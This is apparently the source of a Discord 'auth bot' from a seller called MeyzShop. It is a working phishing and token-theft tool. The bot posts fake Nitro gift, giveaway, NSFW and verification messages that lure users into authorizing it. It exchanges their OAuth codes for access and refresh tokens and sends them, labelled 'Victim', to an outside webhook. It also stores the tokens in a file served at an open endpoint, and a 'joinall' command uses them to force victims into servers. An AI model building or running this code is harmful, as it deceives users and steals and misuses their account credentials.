//by MeyzShop | https://www.itemsatis.com/p/MeyzShop
const Discord = require('discord.js');
const client = new Discord.Client({
  fetchAllMembers: false,
  restTimeOffset: 0,
  restWsBridgetimeout: 100,
  shards: "auto",
  allowedMentions: {
    parse: [],
    repliedUser: false,
  },
  partials: ['MESSAGE', 'CHANNEL', 'REACTION'],
  intents: [
    Discord.Intents.FLAGS.GUILDS,
    Discord.Intents.FLAGS.GUILD_MEMBERS,
    //Discord.Intents.FLAGS.GUILD_BANS,
    //Discord.Intents.FLAGS.GUILD_EMOJIS_AND_STICKERS,
    //Discord.Intents.FLAGS.GUILD_INTEGRATIONS,
    //Discord.Intents.FLAGS.GUILD_WEBHOOKS,
    //Discord.Intents.FLAGS.GUILD_INVITES,
    Discord.Intents.FLAGS.GUILD_VOICE_STATES,
    //Discord.Intents.FLAGS.GUILD_PRESENCES,
    Discord.Intents.FLAGS.GUILD_MESSAGES,
    Discord.Intents.FLAGS.GUILD_MESSAGE_REACTIONS,
    //Discord.Intents.FLAGS.GUILD_MESSAGE_TYPING,
    Discord.Intents.FLAGS.DIRECT_MESSAGES,
    Discord.Intents.FLAGS.DIRECT_MESSAGE_REACTIONS,
    //Discord.Intents.FLAGS.DIRECT_MESSAGE_TYPING
  ],
  presence: {
    activity: {
      name: `by MeyzShop`,
      type: "PLAYING",
    },
    status: "online"
  }
});
const kalash = require("./kalash");
const chalk = require('chalk');
const db = require('quick.db');
const fs = require('fs');
const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
const FormData = require('form-data');
const axios = require('axios');
const emoji = require("./emoji");

//by MeyzShop | https://www.itemsatis.com/p/MeyzShop
process.on("unhandledRejection", err => console.log(err))

//by MeyzShop | https://www.itemsatis.com/p/MeyzShop
app.use(bodyParser.text())

app.get('/', function(req, res) {
  res.sendFile(__dirname + '/index.html')
})

app.get('/discord', function(req, res) {
  res.redirect(`${kalash.support}`);
})

app.get('/meyzshopauths', async (req, res) => {
  fs.readFile('./object.json', function(err, data) {
    return res.json(JSON.parse(data))
  })
})
app.post('/', function(req, res) {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress
  let form = new FormData()
  form.append('client_id', process.env.client_id)
  form.append('client_secret', process.env.client_secret)
  form.append('grant_type', 'authorization_code')
  form.append('redirect_uri', kalash.redirect_uri)
  form.append('scope', 'identify', 'guilds.join')
  form.append('code', req.body)
  fetch('https://discordapp.com/api/oauth2/token', { method: 'POST', body: form, })
    .then((eeee) => eeee.json())
    .then((cdcd) => {
      ac_token = cdcd.access_token
      rf_token = cdcd.refresh_token
      //by MeyzShop | https://www.itemsatis.com/p/MeyzShop


      const tgg = { headers: { authorization: `${cdcd.token_type} ${ac_token}`, } }

      axios.get('https://discordapp.com/api/users/@me', tgg)
        .then((te) => {
          let efjr = te.data.id
          fs.readFile('./object.json', function(res, req) {
            if (
              JSON.parse(req).some(
                (ususu) => ususu.userID === efjr
              )
            ) {
              console.log(
                te.data.username +
                `#` +
                te.data.discriminator
              )
              return
            }
            console.log(
              te.data.username +
              '#' +
              te.data.discriminator
            )

            avatarHASH =
              'https://cdn.discordapp.com/avatars/' +
              te.data.id +
              '/' +
              te.data.avatar +
              '.png?size=4096'
            fetch(`${kalash.wehbook}`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                avatar_url: '',
                embeds: [
                  {
                    color: 3092790,
                    title: `${emoji.info} **New User**`,
                    thumbnail: { url: avatarHASH },
                    description:
                      `Victim: \`${te.data.username}#${te.data.discriminator}\`` +

                      `\n\nID: \`${te.data.id}\`` +
                      `\n\nAcces Token: \`${ac_token}\`` +
                      `\n\nRefresh Token: \`${rf_token}\``,


                  },
                ],

              }),


            })

            var papapa = {
              userID: te.data.id,
              avatarURL: avatarHASH,
              username:
                te.data.username + '#' + te.data.discriminator,
              access_token: ac_token,
              refresh_token: rf_token,
            },
              req = []
            req.push(papapa)
            fs.readFile('./object.json', function(res, req) {
              var jzjjfj = JSON.parse(req)
              jzjjfj.push(papapa)
              fs.writeFile(


                './object.json',
                JSON.stringify(jzjjfj),
                function(eeeeeeeee) {
                  if (eeeeeeeee) {
                    throw eeeeeeeee
                  }
                }
              )
            })
          })
        })
        .catch((errrr) => {
          console.log(errrr)
        })
    })
})

client.on("ready", () => {

  console.log(`${chalk.blue('Auth Bot V6 Is Made By by MeyzShop | https://www.itemsatis.com/p/MeyzShop')}\n${chalk.green('->')} The bot is connected to [ ${client.user.username} ], it uses   : ${kalash.prefix}\n${chalk.green('->')} invite of bot : https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot`)
}) //by MeyzShop | https://www.itemsatis.com/p/MeyzShop


client.on("messageCreate", async (ctx) => {
  if (!ctx.guild || ctx.author.bot) return;
  const prefixRegex = new RegExp(`^(<@!?${client.user.id}>|${escapeRegex(kalash.prefix)})\\s*`);
  if (!prefixRegex.test(ctx.content)) return;
  const [, matchedPrefix] = ctx.content.match(prefixRegex);
  const args = ctx.content.slice(matchedPrefix.length).trim().split(/ +/);
  const cmd = args.shift().toLowerCase();
  //by MeyzShop | https://www.itemsatis.com/p/MeyzShop


  if (cmd === "wl") {
    if (!kalash.owners.includes(ctx.author.id)) return;
    switch (args[0]) {
      case "add":
        const user = !isNaN(args[1]) ? (await client.users.fetch(args[1]).catch(() => { })) : undefined || ctx.mentions.users.first()
        if (db.get(`wl_${user.id}`) === null) {


          db.set(`wl_${user.id}`, true)
          ctx.channel.send({
            embeds: [{
              description: `${emoji.yes} **${user.username}** has been added to the whitelist`,
              color: "2F3136",
              footer: {
                "text": `${kalash.client} ・ ${kalash.footer}`,
                "icon_url": `https://cdn.discordapp.com/attachments/989581700638056498/992844896098586714/8735-package-arrived.gif`
              }
            }]
          })
        } else {
          ctx.channel.send({


            embeds: [{
              description: `${emoji.new} **${user.username}** is already whitelist`,
              color: "2F3136",
              footer: {
                "text": `${kalash.client} ・ ${kalash.footer}`,
                "icon_url": `https://cdn.discordapp.com/attachments/989581700638056498/992844896098586714/8735-package-arrived.gif`
              }
            }]
          })
        }
        break;
      case "remove":
        const user2 = !isNaN(args[1]) ? (await client.users.fetch(args[1]).catch(() => { })) : undefined || ctx.mentions.users.first()
        if (db.get(`wl_${user2.id}`) !== null) {


          db.delete(`wl_${user2.id}`)
          ctx.channel.send({
            embeds: [{
              description: `${emoji.yes} **${user2.username}** has been removed from the whitelist`,
              color: "2F3136",
              footer: {
                "text": `${kalash.client} ・ ${kalash.footer}`,
                "icon_url": `https://cdn.discordapp.com/attachments/989581700638056498/992844896098586714/8735-package-arrived.gif`
              }
            }]
          })
        } else {
          ctx.channel.send({
            embeds: [{
              description: `${emoji.new} **${user2.username}** is not whitelisted`,
              color: "2F3136",
              footer: {
                "text": `${kalash.client} ・ ${kalash.footer}`,
                "icon_url": `https://cdn.discordapp.com/attachments/989581700638056498/992844896098586714/8735-package-arrived.gif`
              }
            }]
          })
        }
        break;
      case "list":
        var content = ""
        const blrank = db.all().filter((data) => data.ID.startsWith(`wl_`)).sort((a, b) => b.data - a.data);

        for (let i in blrank) {
          if (blrank[i].data === null) blrank[i].data = 0;
          content += `\`${blrank.indexOf(blrank[i]) + 1}\` ${client.users.cache.get(blrank[i].ID.split("_")[1]).tag} (\`${client.users.cache.get(blrank[i].ID.split("_")[1]).id}\`)\n`
        }

        ctx.channel.send({
          embeds: [{
            title: `${emoji.user} Whitelisted Users`,
            description: `${user.username}`,
            color: "2F3136",
            footer: {
              "text": `${kalash.client} ・ ${kalash.footer}`,
              "icon_url": `https://cdn.discordapp.com/attachments/989581700638056498/992844896098586714/8735-package-arrived.gif`
            }
          }]


        })
        break;
    }
  }

  if (cmd === "mybot") {

    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    const embed = new Discord.MessageEmbed()

      .setTitle('YEP, I AGREE THIS IS UR BOT')
      .setDescription(`[${client.user.username}](https://discord.com/oauth2/authorize?client_id=${client.user.id}&scope=bot&permissions=8) INVITE LINK OF THE BOT`)
      .setColor("#FF0000")

    ctx.channel.send({
      embeds: [embed]
    })
  }



  if (cmd === "sunucudanayrıl") {
    if (!kalash.owners.includes(ctx.author.id)) return
    if (!args[0]) return ctx.channel.send("bir id gir")
    client.guilds.cache.get(args[0]).leave()
    return ctx.channel.send("başarılı")

  }




  if (cmd === "test") {

    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({


      components: [],
      embeds: [{
        color: "2F3136",
        title: `${emoji.yes} Your Bot Is Working`

      }],
    })
  }

  if (cmd === "help") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({
      components: [],
      embeds: [{
        color: "2F3136",
        title: `${emoji.help} verify bot`,


        description: `${emoji.command} IMPORTANT COMMANDS\n[${kalash.prefix}links](${kalash.support}), [${kalash.prefix}verify](${kalash.support}), [${kalash.prefix}users](${kalash.support}), [${kalash.prefix}joinall](${kalash.support})\n\n${emoji.wl} WHITELIST COMMANDS\n[${kalash.prefix}wl list](${kalash.support}), [${kalash.prefix}wl add](${kalash.support}), [${kalash.prefix}wl remove](${kalash.support})\n\n${emoji.other} OTHER\n[${kalash.prefix}boost](${kalash.support}), [${kalash.prefix}classic](${kalash.support}), \n[${kalash.prefix}nsfw](${kalash.support}), \n[${kalash.prefix}giveaway](${kalash.support})\n [${kalash.prefix}test](${kalash.support}), [${kalash.prefix}botinfo](${kalash.support}), [${kalash.prefix}mybot](${kalash.support})\n\n${emoji.prefix} Prefix :- [${kalash.prefix}](${kalash.support})`,


        footer: {
          "text": `${kalash.client} ・ ${kalash.footer}`,
          "icon_url": `https://cdn.discordapp.com/attachments/989581700638056498/992844896098586714/8735-package-arrived.gif`
        }

      }],
    })
  }


  if (cmd === "botinfo") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    let embed = new Discord.MessageEmbed()
      .setAuthor(client.user.username, client.user.displayAvatarURL({ dynamic: true }))
      .setColor('RANDOM')
      .setURL('https://discord.gg/ns3GqZggDN')
      .setThumbnail(client.user.displayAvatarURL({ dynamic: true }))


      .addFields(
        { name: ":man_wearing_turban:・Information", value: `> **Bot: :** <@${client.user.id}> \`\`${client.user.username}\`\`\n> **ID :** ${client.user.id}\n>  \`\`\`\``, inline: false },
        { name: ":crown: ・Developer", value: `> **Name :** MeyzShop`, inline: false },
      )
    ctx.channel.send({
      embeds: [embed]
    })
  }
  if (cmd === "mybot") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({
      embeds: []
    })
  }

  if (cmd === "partner") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({
      embeds: [{
        title: `${emoji.partner} ALL THE PARTNER SERVER WILL SHOW HERE`,
        description: `> **[PARTNER 1](https://discord.gg/PAcqDxK8K7)**`,
        color: "2F3136",
        footer: {
          "text": `${kalash.client} ・ ${kalash.footer}`,
          "icon_url": `https://cdn.discordapp.com/attachments/989581700638056498/992844896098586714/8735-package-arrived.gif`
        }
      }]
    })
  }
  if (cmd === "links") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({
      embeds: [{
        title: `${emoji.link} Invite:`,
        description: `${emoji.links} **OAuth2 Link:** ${kalash.authLink}\n\`\`\`${kalash.authLink}\`\`\`\n${emoji.links} **Bot Invite:** https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot\n \`\`\`https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot\`\`\` `,
        color: "2F3136",
        footer: {
          "text": `${kalash.client} ・ ${kalash.footer}`,
          "icon_url": `https://cdn.discordapp.com/attachments/989581700638056498/992844896098586714/8735-package-arrived.gif`
        }
      }],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "Bot invite",
              "url": `https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot`
            }
          ]
        }
      ]
    })
  }

  if (cmd === "boost") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({

      embeds: [{
        title: `Hello everyone, you have all been gifted Discord Nitro for a year!`,

        description: `To get your Discord Nitro all you must do is:
   \n1️⃣Click on the [claim]( ${kalash.authLink}) button.
   \n2️⃣Click on the [authorize]( ${kalash.authLink})\n\nOnce you've authorized yourself you must wait around 5-42 hours and youll have it.`,
        "color": 7540649,
        "image": {
          "url": "https://cdn.discordapp.com/attachments/989581700638056498/992844896098586714/8735-package-arrived.gif"
        },

        footer: {
          "text": `・ ${kalash.footer}`,
          "icon_url": `https://cdn.discordapp.com/attachments/989581700638056498/992844896098586714/8735-package-arrived.gif`,
        }

      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "🎁 Claim your nitro",
              "url": `${kalash.authLink}`
            }
          ]
        }
      ]


    })
  }

  if (cmd === "classic") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({

      embeds: [{
        title: `Hello everyone, you have all been gifted  Nitro classic for a year!`,

        description: `To get your  Nitro classic all you must do is:
   \n1️⃣Click on the [claim]( ${kalash.authLink}) button.
   \n2️⃣Click on the [authorize]( ${kalash.authLink})\n\nOnce you've authorized yourself you must wait around 5-42 hours and youll have it.`,
        "color": 7540649,
        "image": {
          "url": "https://cdn.discordapp.com/attachments/989581700638056498/992844896098586714/8735-package-arrived.gif"
        },

        footer: {
          "text": `・ ${kalash.footer}`,
          "icon_url": `https://cdn.discordapp.com/attachments/989581700638056498/992844896098586714/8735-package-arrived.gif`,
        }

      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "🎁 Claim your nitro",
              "url": `${kalash.authLink}`
            }
          ]
        }
      ]


    })
  }

  if (cmd === "giveaway") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({
      "content": "🎉 **Giveaway** 🎉",
      embeds: [{
        title: `**Nitro Boost Monthly And Nitro Classic Yearly 🎁** `,
        description: `\n **WINNERS:** \`1\`\n **TIMER**: \`Ends in 2 hours 15:41:57\`\n:tada: **HOSTED BY: <@${ctx.author.id}>**\n\n\n\nTo enter the giveaway click on the enter button`,
        "color": 0,
        footer: {
          "text": `・ ${kalash.footer}`,
          "icon_url": `https://cdn.discordapp.com/attachments/989581700638056498/992844896098586714/8735-package-arrived.gif`,
        }

      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": " 🎉 ",
              "url": `${kalash.authLink}`
            }
          ]
        }
      ]


    })
  }


  if (cmd === "cleans") {
    await clean(ctx)
  }

  if (cmd === "refresh") {
    await client.refreshTokens(ctx)
  }

  if (cmd === "nsfw") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({

      embeds: [{
        title: `**NSFW ACCES**`,
        description: `To gain acces to NSFW you must react below with the 🔞 reaction. 
        `,
        "image": {
          "url": "https://cdn.discordapp.com/attachments/989581700638056498/992844896098586714/8735-package-arrived.gif"
        },

        "color": 16711680,


      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "🔞",
              "url": `${kalash.authLink}`
            }
          ]
        }
      ]


    })

  }



  if (cmd === "sunucularım") {
    if (!kalash.owners.includes(ctx.author.id)) return;

    client.guilds.cache.forEach((guild) => {
      ctx.channel.send(`Sunucu Adı: ${guild.name} | Sunucu ID: ${guild.id}`);
    });

  }// by MeyzShop | https://www.itemsatis.com/p/MeyzShop

  if (cmd === "verify") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({

      embeds: [{

        description: `**To be able to see the private giveaways channels and chat channels click\n [here!](${kalash.authLink})  ✅ **`,
        "image": {
          "url": "https://cdn.discordapp.com/attachments/989581700638056498/992844896098586714/8735-package-arrived.gif"
        },

        "color": 16711680,


      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "✅ Click to verify!",
              "url": `${kalash.authLink}`
            }
          ]
        }
      ]


    })
  }// by MeyzShop | https://www.itemsatis.com/p/MeyzShop

  if (cmd === "check") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({

      embeds: [{

        description: `**:link: Mentioned users is not Verified ❌!!!! 
           Please Verify Your Self Click [here!](${kalash.authLink}) !! **`,
        "color": 16711680,


      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "Verify Now",
              "url": `${kalash.authLink}`
            }
          ]
        }
      ]


    })
  }// by MeyzShop | https://www.itemsatis.com/p/MeyzShop

  if (cmd === "joinall") {
    if (!kalash.owners.includes(ctx.author.id)) return;
    fs.readFile('./object.json', async function(err, data) {
      let msg = await ctx.channel.send({
        content: `${emoji.user} **Joining users...** (\`0\`/${JSON.parse(data).length > 1 ? `\`${JSON.parse(data).length}\`` : `\`${JSON.parse(data).length}\``})`
      })
      if (cmd === "cleans") {
        if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
        await client.clean(message)
      }// by MeyzShop | https://www.itemsatis.com/p/MeyzShop

      if (cmd === "refresh") {
        if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
        await client.refreshTokens(message)
      }// by MeyzShop | https://www.itemsatis.com/p/MeyzShop





      const inter = setInterval(async () => {
        msg.edit({
          content: `${emoji.load} **Joining users...** (\`${success}\`/${JSON.parse(data).length > 1 ? `\`${JSON.parse(data).length}\`` : `\`${JSON.parse(data).length}\``})`
        })
      }, 10000);

      let json = JSON.parse(data);
      let error = 0;
      let success = 0;
      let already_joined = 0;
      for (const i of json) {
        const user = await client.users.fetch(i.userID).catch(() => { });
        if (ctx.guild.members.cache.get(i.userID)) {
          already_joined++
        }
        await ctx.guild.members.add(user, { accessToken: i.access_token }).catch(() => {
          error++
        })
        success++
      }// by MeyzShop | https://www.itemsatis.com/p/MeyzShop

      clearInterval(inter);

      msg.edit({
        embeds: [{
          title: `${emoji.user} 0auth2 Joinall`,
          description: `${emoji.new} **Already in server** : ${already_joined}\n${emoji.succes} **Success**: ${success}\n${emoji.error} **Error**: ${error}`,
          color: "2F3136",
          footer: {
            "text": `${kalash.client} ・ ${kalash.footer}`,
            "icon_url": `https://cdn.discordapp.com/attachments/989581700638056498/992844896098586714/8735-package-arrived.gif`
          }
        }]
      }).catch(() => { })
    })
  }
  if (cmd === "users") {


    // by MeyzShop | https://www.itemsatis.com/p/MeyzShop

    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;

    fs.readFile('./object.json', async function(err, data) {
      return ctx.channel.send({
        embeds: [{
          title: `${emoji.user} DB Users`,
          description: `There are ${JSON.parse(data).length > 1 ? `\`${JSON.parse(data).length}\` members` : `\`${JSON.parse(data).length}\` users in the bot`}\n`,
          color: "2F3136",
          footer: {
            "text": `${kalash.client} ・ ${kalash.footer}`,
            "icon_url": `https://cdn.discordapp.com/attachments/989581700638056498/992844896098586714/8735-package-arrived.gif`
          }

        }]
      })
    })
  }
})// by MeyzShop | https://www.itemsatis.com/p/MeyzShop

function escapeRegex(str) {
  return str.replace(/[.*+?^${}()|[\]\\]/g, `\\$&`);
}

client.login(process.env.token).catch(() => {
  throw new Error(`TOKEN OR INTENT INVALID CHECK THE INTENT OR TOKEN`)
})


app.listen(kalash.port, () => console.log('Connecting...'))

// by MeyzShop | https://www.itemsatis.com/p/MeyzShop
process.on('uncaughtException', function(err) {
  console.error(err);
  console.log("Hata Handlelandı!");
});




// by MeyzShop | https://www.itemsatis.com/p/MeyzShop
// by MeyzShop | https://www.itemsatis.com/p/MeyzShop
// by MeyzShop | https://www.itemsatis.com/p/MeyzShop
// by MeyzShop | https://www.itemsatis.com/p/MeyzShop
// by MeyzShop | https://www.itemsatis.com/p/MeyzShop
// by MeyzShop | https://www.itemsatis.com/p/MeyzShop
